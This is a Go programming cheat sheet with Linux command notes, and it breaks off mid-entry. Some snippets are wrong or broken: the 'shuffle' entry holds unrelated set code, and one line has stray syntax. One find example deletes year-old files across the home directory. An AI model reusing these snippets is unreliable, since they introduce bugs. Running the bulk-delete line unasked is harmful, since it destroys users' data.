go
==================================================
Get executable dir
(tags: executable dir)
---

ex, err := os.Executable()
dir := filepath.Dir(ex)
fmt.Println("dir:", dir)
==================================================
Extract beginning of string (prefix)
(tags: extract beginning string prefix)
---

t := string([]rune(s)[:5])
==================================================
Extract string suffix
(tags: extract string suffix)
---

t := string([]rune(s)[len([]rune(s))-5:])
==================================================
Exec other program
(tags: exec program)
---

err := exec.Command("program", "arg1", "arg2").Run()
==================================================
Telegram message markdown
(tags: telegram message markdown)
---

*полужирный*
_курсив_
[ссылка](http://www.example.com/)
`строчный моноширинный`
```text
блочный моноширинный (можно писать код)
```

import "github.com/go-telegram-bot-api/telegram-bot-api"

msg := tgbotapi.NewMessage(update.Message.Chat.ID, update.Message.Text)
msg.ParseMode = "markdown" //msg.ParseMode = tgbotapi.ModeMarkdown"
==================================================
Telegram message html
(tags: telegram message html)
---

<b>полужирный</b>, <strong>полужирный</strong>
<i>курсив</i>
<a href="http://www.example.com/">ссылка</a>
<code>строчный моноширинный</code>
<pre>блочный моноширинный (можно писать код)</pre>

import "github.com/go-telegram-bot-api/telegram-bot-api"

msg := tgbotapi.NewMessage(update.Message.Chat.ID, update.Message.Text)
msg.ParseMode = "HTML" //msg.ParseMode = tgbotapi.ModeHTML
==================================================
Iterate over map entries ordered by keys
(tags: iterate map order key)
---

keys := make([]string, 0, len(mymap))
for k := range mymap {
  keys = append(keys, k)
}
sort.Strings(keys)
for _, k := range keys {
  x := mymap[k]
  fmt.Println("Key =", k, ", Value =", x)
}

==================================================
Iterate over map entries ordered by values
(tags: iterate map order value)
---

type entry struct {
  key   string
  value int
}
entries := make([]entry, 0, len(mymap))
for k, x := range mymap {
  entries = append(entries, entry{key: k, value: x})
}
sort.Slice(entries, func(i, j int) bool {
  return entries[i].value < entries[j].value
})
for _, e := range entries {
  fmt.Println("Key =", e.key, ", Value =", e.value)
}
==================================================
Slice to set
(tags: slice set)
---

y := make(map[T]struct{}, len(x))
for _, v := range x {
  y[v] = struct{}{}
}
==================================================
Deduplicate slice
(tags: deduplicate slice remove duplicate)
---

seen := make(map[T]bool)
j := 0
for _, v := range x {
  if !seen[v] {
    x[j] = v
    j++
    seen[v] = true
  }
}
for i := j; i < len(x); i++ {
  x[i] = nil
}
x = x[:j]
==================================================
Shuffle a slice
(tags: slice shuffle)
---

y := make(map[T]struct{}, len(x))
for _, v := range x {
  y[v] = struct{}{}
}
==================================================
Sort slice asc
(tags: sort slice asc)
---

sort.Slice(items, func(i, j int) bool {
  return items[i].p < items[j].p
})
==================================================
Sort slice desc
(tags: sort slice desc)
---

sort.Slice(items, func(i, j int) bool {
  return items[i].p > items[j].p
})
==================================================
Remove item from slice by index
(tags: remove item slice index)
---

items = append(items[:i], items[i+1:]...)
==================================================
Graph with adjacency lists
(tags: graph struct)
---

type Vertex struct{
  Id int
  Label string
  Neighbours map[*Vertex]bool
}
type Graph []*Vertex
==================================================
Reverse a string
(tags: string reverse)
---

runes := []rune(s)
for i, j := 0, len(runes)-1; i < j; i, j = i+1, j-1 {
   runes[i], runes[j] = runes[j], runes[i]
}
t := string(runes)
==================================================
Insert item in slice
(tags: insert item slice)
---

s = append(s, 0)
copy(s[i+1:], s[i:])
s[i] = x
==================================================
Filter slice
(tags: filter slice)
---

y := make([]T, 0, len(x))
for _, v := range x{
  if p(v){
    y = append(y, v)
  }
}
==================================================
File content to string
(tags: file content string)
---

b, err := ioutil.ReadFile(f)
lines := string(b)
==================================================
Write to std error
(tags: write std error)
---

fmt.Fprintln(os.Stderr, x, "is negative")
==================================================
Big int
(tags: big integer)
---

x := new(big.Int)
x.Exp(big.NewInt(3), big.NewInt(247), nil)
==================================================
Round float to int
(tags: round float int)
---

y := int(math.Floor(x + 0.5))
==================================================
Check if int addition will overflow
(tags: check int add overflow)
---

func willAddOverflow(a, b int64) bool {
  return a > math.MaxInt64 - b
}
==================================================
Check if int multiplication will overflow
(tags: check int multiply overflow)
---

func multiplyWillOverflow(x, y uint64) bool {
  if x <= 1 || y <= 1 {
    return false
  }
  d := x * y
  return d/y != x
}
==================================================
Load json file into struct
(tags: load json file struct)
---

buffer, err := ioutil.ReadFile("data.json")
err = json.Unmarshal(buffer, &x)
==================================================
Load yaml file into struct
(tags: load yaml file struct)
---

import "gopkg.in/yaml.v3"

buffer, err := ioutil.ReadFile("data.yaml")
err = yaml.Unmarshal(buffer, &x)
==================================================
Save struct into json file
(tags: save struct json file)
---

buffer, err := json.MarshalIndent(x, "", "  ")
err = ioutil.WriteFile("data.json", buffer, 0644)
==================================================
Print type of variable
(tags: print type variable)
---

fmt.Printf("%T", x) //fmt.Println(reflect.TypeOf(x))
==================================================
Load from HTTP GET request into a string
(tags: load http get string)
---

res, err := http.Get(u)
buffer, err := ioutil.ReadAll(res.Body)
res.Body.Close()
s := string(buffer)
==================================================
Read int from stdin
(tags: read int std in)
---

_, err := fmt.Scan(&n)
==================================================
UDP listen and read
(tags: udp listen read)
---

ServerAddr,err := net.ResolveUDPAddr("udp",p)
ServerConn, err := net.ListenUDP("udp", ServerAddr)
defer ServerConn.Close()
n,addr,err := ServerConn.ReadFromUDP(b[:1024])
if n<1024 {
    return fmt.Errorf("Only %d bytes could be read.", n)
}
==================================================
Binary search in sorted slice
(tags: binary search slice)
---

func binarySearch(a []T, x T) int {
    imin, imax := 0, len(a)-1
    for imin <= imax {
        imid := (imin + imax) / 2
        switch {
        case a[imid] == x:
        return imid
        case a[imid] < x:
        imin = imid + 1
        default:
        imax = imid - 1
        }
    }
    return -1
}
==================================================
Measure func call duration
(tags: measure func call duration time)
---

t1 := time.Now()
foo()
t := time.Since(t1)
ns := t.Nanoseconds()
fmt.Printf("%dns\n", ns)

or

func Duration(invocation time.Time, name string) {
  elapsed := time.Since(invocation)
  log.Printf("%s lasted %s", name, elapsed)
}
func BigIntFactorial(x big.Int) *big.Int {
  defer profile.Duration(time.Now(), "IntFactorial")

  y := big.NewInt(1)
  for one := big.NewInt(1); x.Sign() > 0; x.Sub(x, one) {
    y.Mul(y, x)
  }
  return x.Set(y)
}
==================================================
Breadth-first traversing in a graph
(tags: bfs traversing graph)
---

func (start *Vertex) Bfs(f func(*Vertex)) {
    queue := []*Vertex{start}
    seen := map[*Vertex]bool{start: true}
    for len(queue) > 0 {
        v := queue[0]
        queue = queue[1:]
        f(v)
        for next, isEdge := range v.Neighbours {
            if isEdge && !seen[next] {
                queue = append(queue, next)
                seen[next] = true
            }
        }
    }
}
==================================================
Depth-first traversing in a graph
(tags: dfs traversing graph)
---

func (v *Vertex) Dfs(f func(*Vertex), seen map[*Vertex]bool) {
    seen[v] = true
    f(v)
    for next, isEdge := range v.Neighbours {
        if isEdge && !seen[next] {
            next.Dfs(f, seen)
        }
    }
}
==================================================
Check if string contains only digits
(tags: check string contains only digits)
---

isNotDigit := func(c rune) bool { return c < '0' || c > '9' }
b := strings.IndexFunc(s, isNotDigit) == -1")
==================================================
Check if file exists
(tags: check file exist)
---

_, err := os.Stat(fp)
b := !os.IsNotExist(err)
==================================================
Read slice of int from stdin
(tags: read slice int std in)
---

var ints []int
s := bufio.NewScanner(os.Stdin)
for s.Scan() {
    i, err := strconv.Atoi(s.Text())
    if err == nil {
        ints = append(ints, i)
    }
}
==================================================
Detect if 32-bit or 64-bit architecture
(tags: detect 32 64 architecture)
---

if strconv.IntSize==32 {
    f32()
}
if strconv.IntSize==64 {
    f64()
}
==================================================
Parse flags
(tags: parse flags args)
---

var b = flag.Bool("b", false, "Do bat")
func main() {
    flag.Parse()
    if *b {
        bar()
    }
}
==================================================
Open URL in default browser
(tags: open url default browser)
---

func openbrowser(url string) {
    var err error
    switch runtime.GOOS {
    case "linux":
        err = exec.Command("xdg-open", url).Start()
    case "windows":
        err = exec.Command("rundll32", "url.dll,FileProtocolHandler", url).Start()
    case "darwin":
        err = exec.Command("open", url).Start()
    default:
        err = fmt.Errorf("unsupported platform")
    }
    if err != nil {
        log.Fatal(err)
    }
}
==================================================
Concatenate two slices
(tags: concat two slice)
---

ab := append(a, b...)
==================================================
String length
(tags: string length)
---

n := utf8.RuneCountInString(s)
==================================================
Make HTTP POST request
(tags: make http post request)
---

response, err := http.Post(u, contentType, body)
==================================================
Bytes to hex string
(tags: byte hex string)
---

s := hex.EncodeToString(a)
==================================================
Hex string to byte array
(tags: byte hex string)
---

a, err := hex.DecodeString(s)
==================================================
Find files with a given list of filename extensions
(tags: file extension walk)
---

L := []string{}
err := filepath.Walk(D, func(path string, info os.FileInfo, err error) error {
    if err != nil {
        fmt.Printf("failure accessing a path %q: %v\n", path, err)
        return err
    }
    for _, ext := range []string{".jpg", ".jpeg", ".png"} {
        if strings.HasSuffix(path, ext) {
            L = append(L, path)
            break
        }
    }
    return nil
})

==================================================
Check if point is inside rectangle
(tags: check point inside rect)
---

p := image.Pt(x, y)
r := image.Rect(x1, y1, x2, y2)
b := p.In(r)
==================================================
List files in directory
(tags: list file dir)
---

x, err := ioutil.ReadDir(d)
==================================================
Make HTTP PUT request
(tags: make http put request)
---

req, err := http.NewRequest("PUT", u, body)
req.Header.Set("Content-Type", contentType)
req.ContentLength = contentLength
response, err := http.DefaultClient.Do(req)
==================================================
Execute function in 30 seconds
(tags: exec func after time)
---

timer := time.AfterFunc(
    30*time.Second,
    func() {
        f(42)
    })
==================================================
Matrix multiplication
(tags: matrix multiply)
---

c := new(mat.Dense)
c.Mul(a, b)
==================================================
Filter and transform slice
(tags: filter transform slice)
---

var y []Result
for _, e := range x {
    if P(e) {
        y = append(y, T(e))
    }
}
==================================================
Get an environment variable
(tags: env var)
---

foo, ok := os.LookupEnv("FOO")
if !ok {
    foo = "none"
}
==================================================
Create folder
(tags: create folder dir)
---

err := os.MkdirAll(path, os.ModeDir)
==================================================
Pad string on the right
(tags: pad string right)
---

if n := utf8.RuneCountInString(s); n < m {
    s += strings.Repeat(c, m-n)
}
==================================================
Pad string on the left
(tags: pad string left)
---

if n := utf8.RuneCountInString(s); n < m {
    s = strings.Repeat(c, m-n) + s
}
==================================================
Progress bar
(tags: progress bar)
---

func printProgressBar(n int, total int) {
    var bar []string
    tantPerFourty := int((float64(n) / float64(total)) * 40)
    tantPerCent := int((float64(n) / float64(total)) * 100)
    for i := 0; i < tantPerFourty; i++ {
        bar = append(bar, "█")
    }
    progressBar := strings.Join(bar, "")
    fmt.Printf("\r " + progressBar + " - " + strconv.Itoa(tantPerCent) + "")
}
==================================================
Create a zip archive
(tags: create zip archive)
---

buf := new(bytes.Buffer)
w := zip.NewWriter(buf)
for _, filename := range list {
    input, err := os.Open(filename)
    output, err := w.Create(filename)
    _, err = io.Copy(output, input)
}
err := w.Close()
err = ioutil.WriteFile(name, buf.Bytes(), 0777)
==================================================
Slice intersection
(tags: slice intersection)
---

seta := make(map[T]bool, len(a))
for _, x := range a {
    seta[x] = true
}
setb := make(map[T]bool, len(a))
for _, y := range b {
    setb[y] = true
}

var c []T
for x := range seta {
    if setb[x] {
        c = append(c, x)
    }
}
==================================================
Replace multiple spaces with single space
(tags: replace space)
---

whitespaces := regexp.MustCompile('\\s+')
t := whitespaces.ReplaceAllString(s, " ")
==================================================
Create a tuple value
(tags: create tuple interface)
---

t := []interface{}{
    2.5,
    "hello",
    make(chan int),
}
==================================================
Remove all non-digits chars
(tags: remove digit char)
---

re := regexp.MustCompile("[^\\\\d]")
t := re.ReplaceAllLiteralString(s, "")
==================================================
Add element to the beginning of the slice
(tags: add beginning slice)
---

items = append([]T{x}, items...)
==================================================
Copy slice
(tags: copy slice)
---

y := make([]T, len(x))
copy(y, x)
==================================================
Copy file
(tags: copy file)
---

func copy(dst, src string) error {
    data, err := ioutil.ReadFile(src)
    stat, err := os.Stat(src)
    return ioutil.WriteFile(dst, data, stat.Mode())
}
==================================================
Cancel an operation
(tags: cancel operation func)
---

ctx, cancel := context.WithCancel(context.Background())
go p(ctx)
somethingElse()
cancel()
==================================================
Timeout
(tags: timeout operation func)
---

ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
defer cancel()
p(ctx)
==================================================
Check if bytes are a valid UTF-8 string
(tags: check byte valid utf8)
---

b := utf8.Valid(s)
==================================================
Encode bytes to base64
(tags: encode byte base64)
---

s := base64.StdEncoding.EncodeToString(data)
==================================================
Decode base64
(tags: decode string base64)
---

data, err := base64.StdEncoding.DecodeString(s)
==================================================
Set value on field of structure in map
(tags: set value field struct map)
---

temp := m[key]
temp.SomeField = 42
m[key] = temp
==================================================
Deploy on Heroku
(tags: heroku deploy)
---

Check this:
1. On site heroku/<myappname>/recources web toggle button turn on
2. In code http.ListenAndServe(":" + os.Getenv("PORT"), nil)
3. In root app's dir you have "Procfile" with "web: bin/myapp"
4. File go.mod have "// +heroku goVersion go1.15" above the line "go 1.15"
==================================================
HTTP file server
(tags: http file server)
---

http.Handle("/", http.FileServer(http.Dir(".")))
http.ListenAndServe(":80", nil)
// log.Fatal(http.ListenAndServe(":8080", http.FileServer(http.Dir("/usr/share/doc"))))
==================================================
Update major version of package in go.mod
(tags: update major version package mod)
---

// go mod init myapp
// go mod vendor
add version on import github.com/go-telegram-bot-api/telegram-bot-api/v5
or if you want to use the newest commit
go get github.com/go-telegram-bot-api/telegram-bot-api@b6df6c2
go mod tidy
==================================================
Using go mod vendor
(tags: mod vendor)
---

go mod init myapp
go mod vendor
go build -mod=vendor main.go
==================================================
Linux tcpdump
(tags: linux tcpdump)
---

// output format
[Timestamp] [Protocol] [Src IP].[Src Port] > [Dst IP].[Dst Port]: [Flags], [Seq], [Ack], [Win Size], [Options], [Data Length]
// show available interfaces
tcpdump -D
// catch all packets
tcpdump -i any
// catch first 5 packets
tcpdump -i any -c 5
// do not resolve ip (-n) and ports (-nn)
tcpdump -i any -c5 -nn
// filter by icmp packets
tcpdump -i any -c5 icmp
// filter packets by a special host
tcpdump -i any -c5 -nn host 54.204.39.132
// filer packets by subnet
tcpdump -n net 192.168.1
// filter by port
tcpdump -i any -c5 -nn port 80
// filter by ports
tcpdump -n portrange 11128-11142
// filter by destination
tcpdump -i any -c5 -nn dst 192.168.122.98
// complexly
tcpdump -i any -c5 -nn src 192.168.122.98 and port 80
tcpdump -i any -c5 -nn "port 80 and (src 192.168.122.98 or src 54.204.39.132)"
// print packet content in ascii (-A) or hex (-X)
tcpdump -i any -c10 -nn -A port 80
// save result in file
tcpdump -i any -c10 -nn -w webserver.pcap port 80
// read result from file (you may use wireshark)
tcpdump -nn -r webserver.pcap
tcpdump -nn -r webserver.pcap src 54.204.39.132
==================================================
Linux info
(tags: linux info)
---

id      // info about your account
w       // who there are in the system now
lscpu   // info about processors
lsof    // list of open files
free    // info about memory
cat     // show content of the file
less    // show file in fragments
more    // for big files
tail -f // show end of file in interactive
cmp     // compare files by bytes
comm    // show sort files string by string
diff    // show diff between files
grep    // find in text by regexp
find    // find files
wc      // words count

https://opensource.com/article/20/12/linux-server

uname -a    // full user info
hostnamectl // server info (virtual or not)
uptime      // working time
who -Hu     // user info
dmidecode -s system-product-name // virtual or not
pstree       // processes info
pstree -pa 1 //
ps -ef
ps auxf
systemctl
netstat -tulpn // network connections
netstat -anp
lsof -i
ss
iptables -L -n
cat /etc/resolv.conf
uname -r          // kernel
cat /proc/cmdline
lsmod
modinfo <module>
sysctl -a
cat /boot/grub2/grub.cfg
dmesg      // logs
journalctl
==================================================
Linux bash hotkeys
(tags: linux bash hotkeys)
---

alt+b  // move cursor to the start of word (back)
alt+f  // move to the end of word (forward)
ctrl+a // move to the start
ctrl+e // move to the end
ctrl+]<char> // move right to first <char> entry
ctrl+alt+]<char> // move left to <char>
ctrl+w // remove word before the cursor
alt+d  // remove word after
ctrl+u // remove all before cursor
ctrl+k // remove all after cursor
ctrl+y // return removed
!! // repeat last command
!$ // "cat a.txt" then "less !$" = "less a.txt"
!* // "head a.txt | grep '^Al'" then "tail !*"
alt+. // insert last arg from previous command
alt+<N>+alt+. // insert <N> arg from previous command
>a.txt // creat file or clean it
ctrl+l // clean terminal
ctrl+r // show history
ctrl+d // exit
==================================================
Linux std
(tags: linux std in out err)
---

> send to stream
< get from straem
>> append to stream
<< join stream
// send stdout to out.txt, stderr to err.txt
./myapp > out.txt 2> err.txt
// send stdout and stderr in outerr.txt
./myapp > outerr.txt 2>&1 ac -pd &> outerr.txt
// skip stdout and stderr
./myapp &> /dev/null
// stdout as arg
diff <(ls dirA) <(ls dirB)
// create files with names from list
xargs touch < list.txt
==================================================
Linux find
(tags: linux find)
---

find /opt -name "README*" -exec wc -l {} +
// criteria:
-name,  -iname, -type (f, d, l), -inum <Н>, -not-name
-user<uname>, -group<gname>,  -perm (ugo+/-rwx)
-size +x[c], -empty, -newer <fname>
-atime +x, -amin +x, -mmin -x, -mtime -x
-and (-a), or (-o)
-~ (hiden files), -perm (permissions)
// actions:
-print — default print
-ls — exec ls -lids for every result file
-exec cmd — exec command
-ok cmd — exec command after user confirmation
// examples:
find . -type f -iname "*.txt" — xt-files in curdir
find . -maxdepth 1 — equivalent ls
find ./somedir -type f -size +512M -print — all files large then 512M in ./somedir
find /usr/bin ! -type l — no symbol link in /usr/bin
find $HOME -type f -atime +365 -exec rm {} + — remove all files that have not been available for a year
find . \( -name "*.c" -o -name "*.h" \) — all files with .c or .h extention
==================================================
Linux grep
(tags: linux grep)
---

grep -i -n 'c.l' states.txt
// print number of string whoes start with t
printf "one\ntwo\nthree\nfour\nfive" | grep -n '^t'
  2:two
  3:three
// options:
-i: ignore case
-n: print string number with strings
-v: invert - print that not matched
-c: print count of matched strings
-A<n>: print <n> strings after
-B<n>: print <n> strings before
-o: print only matched, not whole string
-E: allowed to use extention regexp
-r: recurcive in dirs
-w: find word
-l: print with file names
--color: colorise print
==================================================
Linux awk
(tags: linux awk)
---

// $0 - all string, $1 - first word, $2 - second...
echo "I'm Tom" | awk '{$2="Bill"; print $0}'
  I'm Bill
printf "12\n32\n54\n6" | awk '{if ($1>20) print $1}'
  32
  54
// use function
printf "first a\nsecond b\nthird c" | awk '{print(toupper($1))}' >&1
  FIRST
  SECOND
  THIRD
// set other word delimeter
printf "first:a\nsecond:b\nthird:c" | awk 'BEGIN{FS=":"}{print(toupper($1))}' >&1
printf "first:a\nsecond:b\nthird:c" | awk -F: '{print(toupper($1))}' >&1
  FIRST
  SECOND
  THIRD
// print last field
printf "a b c d e f" | awk '{print(toupper($NF))}' >&1
  f
// set other string delimeter and use filter
printf "1a 1b 2c 2d 3e 3f" | awk 'BEGIN{RS=" "}{print(toupper($NF))}' | awk '/2/{print $0}'
  2C
  2D
// use variables
echo -e 'one 1\n two 2' | awk '{sum+=$2}END{print sum}'
  3
// sum of values in last column in file
< requests.log awk '{totalBytes+=$NF}END{print totalBytes}'
// substr function (printf(string), system(command), length(string))
printf "1a 1b" | awk 'BEGIN{RS=" "}{print(substr($1,2,1))}'
  a
  b
==================================================
Linux sed
(tags: linux sed)
---

// print 2-4 strings from file, show only result (-n)
printf "one\ntwo\nthree\nfour\nfive" | sed -n '2,4p'
  two
  three
  four
// print without 1-2 strings
printf "one\ntwo\nthree\nfour\nfive" | sed '1,2d'
  three
  four
  five
// replace words
printf "one\ntwo\nthree" | sed 's/tw/TW/g'
  one
  TWo
  three
// replace chars
printf "one\ntwo\nthree" | sed 'y/t/T/'
  one
  Two
  Three
// append string
  printf "one\ntwo" | sed 'a-----'
  one
  -----
  two
  -----
==================================================
Compile for android
(tags: compile android)
---

env GOOS=android GOARCH=arm64 go build main.go
==================================================
Cli tool
(tags: cli tool)
---

import "github.com/urfave/cli/v2"

func main() {
  var language string
  app := &cli.App{
    Flags: []cli.Flag {
      &cli.StringFlag{
        Name:        "lang",
        Aliases:     []string{"l"},
        Value:       "english",
        Usage:       "language for the greeting",
        Destination: &language,
      },
    },
    Action: func(c *cli.Context) error {
      name := "someone"
      if c.NArg() > 0 {
        name = c.Args().Get(0)
      }
      if language == "spanish" {
        fmt.Println("Hola", name)
      } else {
        fmt.Println("Hello", name)
      }
      return nil
    },
  }
  err := app.Run(os.Args)
  if err != nil {
    log.Fatal(err)
  }
}
// Action: act, where func act(c *cli.Context) error - working!
// Action: act, where func act(language stribg) func (c *cli.Context) error - do not working, var is empty!
==================================================
Linux tree
(tags: linux tree)
---

// print only dir with low than 26 files
tree -d --filelimit 26
// print hiden dir, sort by depth, show modify date
tree -avD
// print files that matched template, do not show dir that gave not needed files
tree -P '*.pdf' --prune
// write three with dir into a file
tree -d -o tree_command_results.txt
// print size, user, permissions, full path
tree -hupf
==================================================
Build go app in docker from scratch
(tags: docker build scratch)
---

FROM golang AS builder
ADD . /app
WORKDIR /app
RUN CGO_ENABLED=0 go build -mod=vendor -ldflags '-extldflags "-static"' -o kit

FROM scratch
COPY --from=builder /app/kit /app/kit
EXPOSE 8080 8080
ENTRYPOINT ["/app/kit"]
==================================================
Use prometheus and grafana
(tags: docker prometheus grafana compose)
---

// Dockerfile
FROM golang AS builder
ADD . /app
WORKDIR /app
RUN CGO_ENABLED=0 go build -mod=vendor -ldflags '-extldflags "-static"' -o kit

FROM scratch
COPY --from=builder /app/kit /app/kit
EXPOSE 8080 8080
ENTRYPOINT ["/app/kit"]

// prometheus/prometheus.yml
scrape_configs:
  - job_name: my_group
    scrape_interval: 10s
    static_configs:
      - targets:
          - kit:8080

// docker-compose.yaml
version: "3"

services:
  kit:
    build:
      context: .
      dockerfile: Dockerfile
    ports:
      - 8080:8080

  grafana:
    image: grafana/grafana
    container_name: grafana
    ports:
      - 3000:3000

  prometheus:
    image: prom/prometheus
    container_name: prometheus
#    restart: unless-stopped
    ports:
      - 9090:9090
    volumes:
      - ./prometheus/prometheus.yml:/etc/prometheus/prometheus.yml

// docker-compose up
==================================================
Simple metrics for prometheus
(tags: metrics prometheus)
---

import (
  "github.com/prometheus/client_golang/prometheus"
  "github.com/prometheus/client_golang/prometheus/promauto"
  "github.com/prometheus/client_golang/prometheus/promhttp"
)

func recordMetrics() {
  go func() {
    for {
      opsProcessed.Inc()
      time.Sleep(2 * time.Second)
    }
  }()
}

var opsProcessed = promauto.NewCounter(prometheus.CounterOpts{
    Name: "myapp_processed_ops_total",
    Help: "The total number of processed events",
  })

func main() {
  recordMetrics()
  http.Handle("/metrics", promhttp.Handler())
  http.ListenAndServe(":8080", nil)
}
// curl http://localhost:8080/metrics
==================================================
Install golang on android
(tags: install android)
---

1. Install Termux from Play Market
2. pkg install golang
3. cd ~
4. mkdir gopath
5. export GOPATH=$HOME/gopath
6. pkg install git
7. go get github.com/gorilla/mux
==================================================
Unsafe for loop
(tags: unsafe for loop)
---

arr := []uint32{1, 2, 3}
const size = unsafe.Sizeof(uint32(0)) //4
for i := 0; i < len(arr); i++ {
  fmt.Printf("%d ",
    *(*uint32)( // conver into (*uint32), then take value - *(*uint32)
      unsafe.Pointer( // get address
        // address 0-element + offset size (4)
        uintptr(unsafe.Pointer(&arr[0])) + (uintptr(i) * size)))) // uintptr(i) for type assign
}
==================================================
Unsafe string to bytes without copy
(tags: unsafe string byte)
---

func string2bytes(s string) []byte {
  stringHeader := (*reflect.StringHeader)(unsafe.Pointer(&s))
  bh := reflect.SliceHeader{
    Data: stringHeader.Data,
    Len:  stringHeader.Len,
    Cap:  stringHeader.Len,
  }
  return *(*[]byte)(unsafe.Pointer(&bh))
}
==================================================
Unsafe bytes to string without copy
(tags: unsafe string byte)
---

func bytes2string(b []byte) string {
  sliceHeader := (*reflect.SliceHeader)(unsafe.Pointer(&b))
  sh := reflect.StringHeader{
    Data: sliceHeader.Data,
    Len:  sliceHeader.Len,
  }
  return *(*string)(unsafe.Pointer(&sh))
}
==================================================
Unsafe change struct fields
(tags: unsafe struct field)
---

type Programmer struct {
  name     string
  language string
}
p := Programmer{"Tom", "en"}
name := (*string)(unsafe.Pointer(&p))
*name = "Foma"
lang := (*string)(unsafe.Pointer(uintptr(unsafe.Pointer(&p)) + unsafe.Offsetof(p.language)))
*lang = "ru"
==================================================
Unsafe change unexported struct fields from other package
(tags: unsafe struct field unexported)
---

p2 := a.Programmer2{}
// cannot refer to unexported field or method name (p2.name = "Foma")
// but we can see in source code what the fields there. First field is string
name2 := (*string)(unsafe.Pointer(&p2))
*name2 = "Foma"
// second field is int. Doing the offset by string size
age2 := (*int)(unsafe.Pointer(uintptr(unsafe.Pointer(&p2)) + unsafe.Sizeof(string(""))))
*age2 = 25
// third field is string
lang2 := (*string)(unsafe.Pointer(uintptr(unsafe.Pointer(&p2)) + unsafe.Sizeof(string("")) + unsafe.Sizeof(int(0))))
*lang2 = "ru"
==================================================
Json marshal infinity float to null
(tags: json marshal float nan infinity)
---

type Measure struct {
  Type  string   `json:"type"`
  Power *float64 `json:"power"`
}

func main() {
  val := math.Inf(1)
  power := &val
  if math.IsInf(val, 0) {
    power = nil
  }
  m := Measure{
    Type: "simple",
    Power: power,
  }
  j, _ := json.Marshal(&m)
  fmt.Println(string(j)) // {"type":"simple","power":null}
}
==================================================
Scan arguments in string by template
(tags: scan arg string)
---

var name string
var age int
n, err := fmt.Sscanf("Joe is 22 years old", "%s is %d years old", &name, &age)
==================================================
Printf formats
(tags: printf print format)
---

var i int
var f float32
var s string
var b bool
var c Car

fmt.Printf("%v\n", i) //0
fmt.Printf("%v\n", f) //0
fmt.Printf("%v\n", s) //
fmt.Printf("%v\n", b) //false
fmt.Printf("%v\n", c) //{ 0}

fmt.Printf("%+v\n", i) //0
fmt.Printf("%+v\n", f) //0
fmt.Printf("%+v\n", s) //
fmt.Printf("%+v\n", b) //false
fmt.Printf("%+v\n", c) //{Model: Speed:0}

fmt.Printf("%#v\n", i) //0
fmt.Printf("%#v\n", f) //0
fmt.Printf("%#v\n", s) //""
fmt.Printf("%#v\n", b) //false
fmt.Printf("%#v\n", c) //main.Car{Model:"", Speed:0}

fmt.Printf("%T\n", i) //int
fmt.Printf("%T\n", f) //float32
fmt.Printf("%T\n", s) //string
fmt.Printf("%T\n", b) //bool
fmt.Printf("%T\n", c) //main.Car

fmt.Printf("%%\n") //%

i = 15
f = 32.7
s = "Pri vet!"
b = true
c = Car{"Audi", 200}

fmt.Printf("%#v\n", i) //15
fmt.Printf("%#v\n", f) //32.7
fmt.Printf("%#v\n", s) //"Pri vet!"
fmt.Printf("%#v\n", b) //true
fmt.Printf("%#v\n", c) //main.Car{Model:"Audi", Speed:200}

fmt.Printf("%b\n", i) //1111
fmt.Printf("%c\n", i) //☼
fmt.Printf("%d\n", i) //15
fmt.Printf("%o\n", i) //17
fmt.Printf("%O\n", i) //0o17
fmt.Printf("%q\n", i) //'\x0f'
fmt.Printf("%x\n", i) //f
fmt.Printf("%X\n", i) //F
fmt.Printf("%U\n", i) //U+000F

fmt.Printf("%b\n", f) //8572109p-18
fmt.Printf("%e\n", f) //3.270000e+01
fmt.Printf("%E\n", f) //3.270000E+01
fmt.Printf("%f\n", f) //32.700001
fmt.Printf("%F\n", f) //32.700001
fmt.Printf("%g\n", f) //32.7
fmt.Printf("%G\n", f) //32.7
fmt.Printf("%x\n", f) //0x1.05999ap+05
fmt.Printf("%X\n", f) //0X1.05999AP+05
fmt.Printf("%9.2f\n", f) //  32.70

fmt.Printf("%s\n", s) //Pri vet!
fmt.Printf("%q\n", s) //"Pri vet!"
fmt.Printf("%q\n", "abc\tdef\n") //"abc\tdef\n"
fmt.Printf("%x\n", s) //5072692076657421
fmt.Printf("%X\n", s) //5072692076657421
fmt.Printf("% X\n", s) //50 72 69 20 76 65 74 21

fmt.Println("\n=== Slice ===")
// pointer on 0-element
fmt.Printf("%p\n", []int{1, 2, 3}) //0x11812274

fmt.Println("\n=== Sprintf ===") //pointer
s1 := fmt.Sprintf("%[3]*.[2]*[1]f", 12.0, 2, 6)
s2 := fmt.Sprintf("%6.2f", 12.0)
fmt.Println(s1, s2) // 12.00  12.00
s3 := fmt.Sprintf("%d %d %#[1]x %#x", 16, 17)
fmt.Println(s3) //16 17 0x10 0x11

// errors:
Wrong type or unknown verb: %!verb(type=value)
  Printf("%d", "hi"):        %!d(string=hi)
Too many arguments: %!(EXTRA type=value)
  Printf("hi", "guys"):      hi%!(EXTRA string=guys)
Too few arguments: %!verb(MISSING)
  Printf("hi%d"):            hi%!d(MISSING)
Non-int for width or precision: %!(BADWIDTH) or %!(BADPREC)
  Printf("%*s", 4.5, "hi"):  %!(BADWIDTH)hi
  Printf("%.*s", 4.5, "hi"): %!(BADPREC)hi
Invalid or invalid use of argument index: %!(BADINDEX)
  Printf("%*[2]d", 7):       %!d(BADINDEX)
  Printf("%.[2]d", 7):       %!d(BADINDEX)
if a String method calls panic("bad"), the resulting formatted message will look like
  %!s(PANIC=bad)
==================================================
Date to string
(tags: date string)
---

fileName := fmt.Sprintf("data_%s.txt", time.Now().Format("20060102_150405"))
==================================================
Pattern Chain of responsibility
(tags: pattern chain responsibility)
---

https://github.com/AlexanderGrom/go-patterns

The Chain Of Responsibility pattern refers to object-level behavioral patterns.

The Chain Of Responsibility pattern avoids binding a requestor object to a request receiver object, while giving multiple objects the chance to process the request. The recipients are chained, and the request is chained until it is processed by some object.

In essence, it is a chain of handlers that receive a request in turn, and then decide whether to process it or not. If the request is not processed, then it is forwarded further along the chain. If it is processed, then the pattern itself decides to pass it on or not. If the request is not processed by any handler, then it is simply lost.

Required for implementation:

1. Basic abstract class Handler, which describes the interface of handlers in chains;
2. The ConcreteHandlerA class, which implements the concrete handler A;
3. The ConcreteHandlerB class, which implements the concrete handler B;
4. The ConcreteHandlerC class, which implements a specific C handler;

Note that instead of storing references to all the candidate recipients of the request, each sender stores a single reference to the beginning of the chain, and each recipient has a single reference to its successor, the subsequent element in the chain.

package chain_of_responsibility

// Handler provides a handler interface.
type Handler interface {
  SendRequest(message int) string
}
// ConcreteHandlerA implements handler "A".
type ConcreteHandlerA struct {
  next Handler
}
// SendRequest implementation.
